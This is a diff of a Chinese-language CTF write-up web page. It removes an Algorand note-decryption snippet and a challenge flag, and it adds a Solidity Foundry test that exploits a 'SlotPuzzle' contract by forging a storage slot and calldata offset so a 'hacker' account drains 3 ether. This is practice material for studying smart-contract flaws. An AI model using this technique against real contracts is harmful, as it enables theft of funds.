-<span class="n">transact</span><span class="p">(</span><span class="n">close_txn</span><span class="p">)</span>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">algosdk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;algosdk&#39;</span><span class="p">);</span>
-<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">unsealMessageFromNote</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;algosms&#39;</span><span class="p">);</span>
-
-<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">baseServer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://testnet-algorand.api.purestake.io/idx2&#39;</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="s1">&#39;X-API-Key&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&lt;api-key&gt;&#39;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">slotPuzzleFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SlotPuzzleFactory</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">3</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
+<span class="w">        </span><span class="nx">hacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;hacker&quot;</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">indexerClient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">algosdk</span><span class="p">.</span><span class="nx">Indexer</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">baseServer</span><span class="p">,</span><span class="w"> </span><span class="nx">port</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">calc</span><span class="p">(</span><span class="nx">uint256</span><span class="p">[</span><span class="mf">8</span><span class="p">]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">keys</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">slot</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">8</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">slot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="w"> </span><span class="nx">slot</span><span class="p">)));</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="nx">slot</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// move to variable map</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">slot</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// back to variable hash</span>
+<span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">accRcpt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">algosdk</span><span class="p">.</span><span class="nx">mnemonicToSecretKey</span><span class="p">(</span><span class="s1">&#39;&lt;mnemonic&gt;&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testHack</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">hacker</span><span class="p">,</span><span class="w"> </span><span class="nx">hacker</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">slotPuzzleFactory</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;weth contract should have 3 ether&quot;</span><span class="p">);</span>
 
-<span class="w">    </span><span class="cm">/* get the TXN with encrypted note from indexer */</span>
-<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">SmsTXID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;DPHCQMJZ7BKJZHZO674VWGUO3J7JJAIKFKGSAEDHBSQBVYGV4I7A&quot;</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">txn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">indexerClient</span><span class="p">.</span><span class="nx">lookupTransactionByID</span><span class="p">(</span><span class="nx">SmsTXID</span><span class="p">).</span><span class="k">do</span><span class="p">();</span>
+<span class="w">        </span><span class="c1">// solution</span>
+<span class="w">        </span><span class="nx">Recipients</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">recipients</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Recipients</span><span class="p">[](</span><span class="mf">3</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">recipients</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Recipients</span><span class="p">({</span>
+<span class="w">            </span><span class="nx">account</span><span class="o">:</span><span class="w"> </span><span class="nx">hacker</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">amount</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span>
+<span class="w">        </span><span class="p">});</span>
+<span class="w">        </span><span class="nx">recipients</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">recipients</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
+<span class="w">        </span><span class="nx">recipients</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">recipients</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
 
-<span class="w">    </span><span class="cm">/* convert base64 to bytes */</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">note</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">txn</span><span class="p">.</span><span class="nx">transaction</span><span class="p">.</span><span class="nx">note</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">senderAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">txn</span><span class="p">.</span><span class="nx">transaction</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">slot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">calc</span><span class="p">(</span>
+<span class="w">                </span><span class="p">[</span>
+<span class="w">                    </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">hacker</span><span class="p">)),</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">,</span>
+<span class="w">                    </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">slotPuzzleFactory</span><span class="p">))),</span>
+<span class="w">                    </span><span class="nx">block</span><span class="p">.</span><span class="nx">prevrandao</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">coinbase</span><span class="p">))),</span>
+<span class="w">                    </span><span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">basefee</span><span class="p">))))</span>
+<span class="w">                </span><span class="p">],</span>
+<span class="w">                </span><span class="mf">1</span>
+<span class="w">            </span><span class="p">))</span>
+<span class="w">        </span><span class="p">);</span>
 
-<span class="w">    </span><span class="cm">/* decrypt the note with recipient secret key */</span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">unsealMessageFromNote</span><span class="p">(</span><span class="nx">note</span><span class="p">,</span><span class="w"> </span><span class="nx">senderAddr</span><span class="p">,</span><span class="w"> </span><span class="nx">accRcpt</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">slotPuzzleFactory</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">Parameters</span><span class="p">({</span>
+<span class="w">                </span><span class="nx">totalRecipients</span><span class="o">:</span><span class="w"> </span><span class="mf">3</span><span class="p">,</span>
+<span class="w">                </span><span class="nx">offset</span><span class="o">:</span><span class="w"> </span><span class="mh">0x1a4</span><span class="p">,</span><span class="w">  </span><span class="c1">// offset to the value 0x144</span>
+<span class="w">                </span><span class="nx">recipients</span><span class="o">:</span><span class="w"> </span><span class="nx">recipients</span><span class="p">,</span>
+<span class="w">                </span><span class="nx">slotKey</span><span class="o">:</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="mh">0x144</span><span class="p">,</span><span class="w"> </span><span class="nx">slot</span><span class="p">)</span>
+<span class="w">                </span><span class="c1">// 0x144 = slot.offset(0x1c4) - 0x80</span>
+<span class="w">            </span><span class="p">})</span>
+<span class="w">        </span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">slotPuzzleFactory</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;weth contract should have 0 ether&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">hacker</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;hacker should have 3 ether&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
-
-<span class="nx">main</span><span class="p">();</span>
 </code></pre></div>
-<h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
-<blockquote>
-<p>wctf{1_h0p3_y0u_d0nt_4cc1dent4lly_4get_t0_r3m0ve_th3_4pp}</p>
-</blockquote>
-<h3 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<ul>
-<li><a href="https://developer.algorand.org/docs/get-details/dapps/smart-contracts/frontend/apps">Interact with smart contracts - Algorand Developer Portal</a></li>
-<li><a href="https://developer.algorand.org/docs/get-details/dapps/avm/teal/opcodes">Opcodes - Algorand Developer Portal</a></li>
-<li><a href="https://developer.purestake.io/code-samples">PureStake Developer Portal</a></li>
-<li><a href="https://www.npmjs.com/package/algosms">algosms - npm</a></li>
-</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月21日 20:33:27</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年4月13日 10:03:05</span>
       
     
   </small>
@@ -3593,7 +3221,7 @@ label19:
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../diamond_heist/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Diamond Heist" rel="prev">
+        <a href="../../damn_vulnerable_defi/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Damn Vulnerable DeFi V3" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -3602,20 +3230,20 @@ label19:
               <span class="md-footer__direction">
                 上一页
               </span>
-              Diamond Heist
+              Damn Vulnerable DeFi V3
             </div>
           </div>
         </a>
       
       
         
-        <a href="../../wargames/natas/" class="md-footer__link md-footer__link--next" aria-label="下一页: Natas" rel="next">
+        <a href="../../solana_pathway/" class="md-footer__link md-footer__link--next" aria-label="下一页: Solana Pathway" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              Natas
+              Solana Pathway
             </div>
           </div>
           <div class="md-footer__button md-icon">
@@ -3657,10 +3285,10 @@ label19:
     <div class="md-dialog" data-md-component="dialog">
       <div class="md-dialog__inner md-typeset"></div>
     </div>
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.f758a944.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.f758a944.min.js"></script>
       
         <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
       
